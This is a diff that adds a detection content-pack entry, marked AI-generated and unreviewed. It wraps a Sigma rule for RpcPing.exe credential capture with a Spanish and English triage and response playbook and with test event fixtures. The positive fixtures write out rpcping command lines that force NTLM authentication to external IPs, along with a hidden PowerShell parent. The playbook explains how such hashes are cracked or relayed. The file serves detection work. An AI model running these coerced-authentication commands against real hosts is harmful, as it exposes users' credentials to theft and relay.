@@ -1,0 +1,134 @@
+{
+  "rule": {
+    "id": "93671f99-04eb-4ab4-a161-70d446a84003",
+    "title": "Capture Credentials with Rpcping.exe",
+    "level": "medium",
+    "status": "test",
+    "author": "Julia Fomina, oscd.community",
+    "path": "windows/process_creation/proc_creation_win_rpcping_credential_capture.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_rpcping_credential_capture.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1003"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó RpcPing.exe contra un servidor remoto (-s) con autenticación NTLM (-u NTLM) o sobre named pipes (-t ncacn_np). Esto puede forzar al equipo a enviar un hash NTLM a un servidor controlado por un atacante.",
+      "what_it_detects": "Creación de procesos de RpcPing.exe (Image o OriginalFileName) cuyo CommandLine incluye -s (o /s y otras variantes de guion) y además -u con NTLM, o -t con ncacn_np.",
+      "why_it_matters": "RpcPing es un binario firmado de Windows (LOLBin) que sirve para probar conectividad RPC. Al apuntarlo a un host malicioso, el desafío-respuesta NTLM del usuario se entrega al atacante, quien puede crackearlo o retransmitirlo (relay). Corresponde a acceso a credenciales, ATT&CK T1003.",
+      "triage_steps": [
+        "Revise el CommandLine completo: identifique el destino de -s, el protocolo de -t, el valor de -u y opciones como -a o -e.",
+        "Determine si el servidor destino es interno y conocido, o una IP externa o no inventariada; consulte DNS, CMDB y reputación.",
+        "Examine ParentImage y la cadena de procesos: cmd.exe, powershell.exe, macros de Office o scripts aumentan la sospecha.",
+        "Identifique el usuario que ejecutó el proceso y confirme con su equipo si realiza pruebas RPC legítimas.",
+        "Busque en el mismo host, +/- 15 minutos, conexiones salientes al destino por SMB (445) o RPC (135), y autenticaciones NTLM salientes.",
+        "Pivotee por el destino: otros endpoints que ejecutaron RpcPing o se conectaron a esa IP en las últimas 24 horas.",
+        "Revise alertas previas del host y del usuario, como herramientas de relay, Responder o acceso inicial reciente."
+      ],
+      "false_positives": [
+        "Administradores o personal de soporte probando conectividad RPC a Exchange u otros servidores internos con autenticación NTLM.",
+        "Scripts de diagnóstico o monitoreo que usan RpcPing contra servidores conocidos sobre ncacn_np.",
+        "Ejercicios autorizados de red team o pentest; valide contra el calendario de pruebas."
+      ],
+      "response_steps": [
+        "Verifique con el usuario y el responsable del equipo si la ejecución fue autorizada antes de actuar.",
+        "Si es maliciosa, aísle el endpoint y bloquee la IP o dominio de destino en firewall y proxy.",
+        "Restablezca la contraseña de la cuenta expuesta y revise autenticaciones posteriores de esa cuenta en busca de relay o uso indebido.",
+        "Investigue y elimine el mecanismo que lanzó RpcPing (script, tarea programada, documento malicioso).",
+        "Considere restringir NTLM saliente y habilitar firma SMB para reducir el riesgo de relay."
+      ],
+      "severity_rationale": "Nivel medio: el uso legítimo existe pero es poco común, y el impacto real depende de si el destino está controlado por un atacante."
+    },
+    "en": {
+      "summary": "RpcPing.exe was run against a remote server (-s) with NTLM authentication (-u NTLM) or over named pipes (-t ncacn_np). This can force the host to send an NTLM hash to an attacker-controlled server.",
+      "what_it_detects": "Process creation of RpcPing.exe (Image or OriginalFileName) where CommandLine contains -s (or /s and other dash variants) plus either -u with NTLM, or -t with ncacn_np.",
+      "why_it_matters": "RpcPing is a signed Windows binary (LOLBin) for testing RPC connectivity. Pointed at a malicious host, it hands the user's NTLM challenge-response to the attacker for cracking or relay. This is credential access, ATT&CK T1003.",
+      "triage_steps": [
+        "Read the full CommandLine: note the -s target, the -t protocol sequence, the -u value and options such as -a or -e.",
+        "Decide whether the target server is internal and known or an external or unknown IP; check DNS, CMDB and reputation.",
+        "Inspect ParentImage and the process tree: cmd.exe, powershell.exe, Office macros or scripts raise suspicion.",
+        "Identify the executing user and confirm with their team whether they perform legitimate RPC testing.",
+        "On the same host within +/- 15 minutes, look for outbound SMB (445) or RPC (135) connections to the target and outbound NTLM authentications.",
+        "Pivot on the target: other endpoints that ran RpcPing or connected to that IP in the last 24 hours.",
+        "Review earlier alerts for the host and user, such as relay tooling, Responder or recent initial access."
+      ],
+      "false_positives": [
+        "Administrators or support staff testing RPC connectivity to Exchange or other internal servers with NTLM authentication.",
+        "Diagnostic or monitoring scripts running RpcPing against known servers over ncacn_np.",
+        "Authorized red team or penetration tests; check the testing schedule."
+      ],
+      "response_steps": [
+        "Confirm with the user and system owner whether the execution was authorized before acting.",
+        "If malicious, isolate the endpoint and block the target IP or domain at the firewall and proxy.",
+        "Reset the exposed account's password and review its subsequent logons for relay or misuse.",
+        "Find and remove whatever launched RpcPing (script, scheduled task, malicious document).",
+        "Consider restricting outbound NTLM and enforcing SMB signing to reduce relay risk."
+      ],
+      "severity_rationale": "Medium fits because legitimate use exists but is rare, and real impact depends on whether the target is attacker-controlled."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "RpcPing sends an NTLM-authenticated RPC test to an external IP, forcing the user's NTLM hash to be sent",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\RpcPing.exe",
+          "OriginalFileName": "RPCPING.EXE",
+          "CommandLine": "rpcping -s 203.0.113.45 -e 1234 -a privacy -u NTLM",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c rpcping -s 203.0.113.45 -e 1234 -a privacy -u NTLM"
+        }
+      },
+      {
+        "description": "RpcPing with slash-style options over named pipes (ncacn_np) to an unknown host, launched from PowerShell",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrodriguez",
+          "Image": "C:\\Windows\\System32\\RpcPing.exe",
+          "OriginalFileName": "RPCPING.EXE",
+          "CommandLine": "RpcPing.exe /s 198.51.100.20 /t ncacn_np",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentCommandLine": "powershell.exe -nop -w hidden"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Admin tests RPC over TCP to an internal server; no NTLM user option and protocol is not ncacn_np",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-ADM-01.andes.example.com",
+          "User": "ANDES\\admin.lgomez",
+          "Image": "C:\\Windows\\System32\\RpcPing.exe",
+          "OriginalFileName": "RPCPING.EXE",
+          "CommandLine": "rpcping.exe -s fileserver01.example.com -t ncacn_ip_tcp -e 135",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      {
+        "description": "A different binary uses -s and ncacn_np in its command line; Image is not RpcPing.exe",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Program Files\\NetDiag\\rpcdiag.exe",
+          "OriginalFileName": "rpcdiag.exe",
+          "CommandLine": "rpcdiag.exe -s fileserver01.example.com -t ncacn_np",
+          "ParentImage": "C:\\Windows\\explorer.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
